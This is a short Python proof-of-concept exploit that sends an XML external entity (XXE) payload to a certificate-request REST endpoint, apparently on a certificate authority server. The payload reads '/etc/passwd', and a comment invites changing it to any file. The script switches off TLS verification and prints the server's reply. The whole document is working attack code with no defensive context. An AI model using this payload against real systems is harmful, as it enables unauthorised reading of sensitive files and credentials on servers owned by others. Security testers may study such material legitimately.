

#!/usr/bin/env python3
import requests
import json

# Your URL
url = "https://YOUR_HOST/ca/rest/certrequests"

# # change "/etc/passwd" to the file you want
payload="""
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
"""
headers = {'Content-Type': 'application/xml'}
response = requests.post(url, data=payload, headers=headers, verify=False)

print("Status Code", response.status_code)
print("XML Response:", response.text)
